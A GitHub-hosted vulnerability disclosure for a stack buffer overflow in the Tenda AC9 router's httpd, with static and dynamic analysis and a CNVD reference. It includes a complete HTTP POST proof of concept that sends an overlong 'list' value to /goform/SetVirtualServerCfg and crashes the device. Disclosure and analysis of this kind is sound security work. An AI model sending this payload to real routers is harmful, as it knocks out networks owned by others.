=== Content from github.com_c79b3817_20250115_083300.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLyc-heng%2Frouters%2Fblob%2Fmain%2Frouters%2Fstack4.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLyc-heng%2Frouters%2Fblob%2Fmain%2Frouters%2Fstack4.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Lyc-heng%2Frouters)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Lyc-heng](/Lyc-heng)
/
**[routers](/Lyc-heng/routers)**
Public

* [Notifications](/login?return_to=%2FLyc-heng%2Frouters) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FLyc-heng%2Frouters)
* [Star
   0](/login?return_to=%2FLyc-heng%2Frouters)

* [Code](/Lyc-heng/routers)
* [Issues
  0](/Lyc-heng/routers/issues)
* [Pull requests
  0](/Lyc-heng/routers/pulls)
* [Actions](/Lyc-heng/routers/actions)
* [Projects
  0](/Lyc-heng/routers/projects)
* [Security](/Lyc-heng/routers/security)
* [Insights](/Lyc-heng/routers/pulse)

Additional navigation options

* [Code](/Lyc-heng/routers)
* [Issues](/Lyc-heng/routers/issues)
* [Pull requests](/Lyc-heng/routers/pulls)
* [Actions](/Lyc-heng/routers/actions)
* [Projects](/Lyc-heng/routers/projects)
* [Security](/Lyc-heng/routers/security)
* [Insights](/Lyc-heng/routers/pulse)

## Files

 main
## Breadcrumbs

1. [routers](/Lyc-heng/routers/tree/main)
2. /[routers](/Lyc-heng/routers/tree/main/routers)
/
# stack4.md

Copy path Blame  Blame
## Latest commit

## History

[History](/Lyc-heng/routers/commits/main/routers/stack4.md)77 lines (49 loc) · 2.82 KB main
## Breadcrumbs

1. [routers](/Lyc-heng/routers/tree/main)
2. /[routers](/Lyc-heng/routers/tree/main/routers)
/
# stack4.md

Top
## File metadata and controls

* Preview
* Code
* Blame

77 lines (49 loc) · 2.82 KB[Raw](https://github.com/Lyc-heng/routers/raw/refs/heads/main/routers/stack4.md)
# Tenda AC9 0day Vulnerability report

## 1、Basci information

vendor: Tenda

product: AC9 and so on

version: V1.0V15.03.05.19（6318）、V3.0V15.03.06.42\_multi and so on

Vulnerability type: buffer overflow

Vulnerability Effect: Denial of Service

## 2、Principle description of vulnerability technology

Affected Vulnerability Components:

* File name: bin/httpd
* function: router virtual service setting

## 3、Vulnerability value

Stable reproducibility: Yes

exploit conditions：

* attack vector type: neighboring network
* Stability of exploit: every attack can be successful
* Whether the product is configured by default: there are loopholes in the functional components that are enabled at the factory

## 4、PoC

```
POST /goform/SetVirtualServerCfg HTTP/1.1
Host: 192.168.56.102
Proxy-Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: password=lqetgb
Content-Length: 821

list=1,1,1,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

## 5、Vulnerability principle

### 5.1 static analysis

After static analysis, the call chain of the function is as follows

```
formSetVirtualSer
  sub_763EC
    sscanf(v23, "%[^,]%*c%[^,]%*c%[^,]%*c%s", &v15, &v13, &v11, &v9) == 4

```

The vulnerability code is shown in the following figure. Because there is no restriction on the parameters passed in by the user, the user can pass in too long malicious data to the `list` parameter, which leads to buffer overflow and eventually causes the effect of denial of service

The detailed procedure is that the function `formSetVirtualSer(int a1)` corresponding to `/goform/SetVirtualServerCfg` receives the parameters from the outside, and at the same time, another function `sub _763ec (inta1, char *a2, unsigned _int8 a3)` is called inside this function, and `sscanf` is used to handle the outside

[![](/Lyc-heng/routers/raw/main/routers/imgs/stack4/code1.PNG)](/Lyc-heng/routers/blob/main/routers/imgs/stack4/code1.PNG)

### 5.2 dynamic analysis

Accident scene when error is triggered

[![](/Lyc-heng/routers/raw/main/routers/imgs/stack4/debug1.PNG)](/Lyc-heng/routers/blob/main/routers/imgs/stack4/debug1.PNG)

After debugging, it can be found that the program made an error after executing `ldr3, [PC, #0x114]` with address 0x767f4. The reason is that the value of register PC changed into maliciously injected data, which caused the program to execute an illegal instruction and finally caused the program to crash

[![](/Lyc-heng/routers/raw/main/routers/imgs/stack4/debug2.PNG)](/Lyc-heng/routers/blob/main/routers/imgs/stack4/debug2.PNG)

## 6、CNVD reference

[CNVD reference](https://www.cnvd.org.cn/flaw/show/CNVD-2021-24948)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


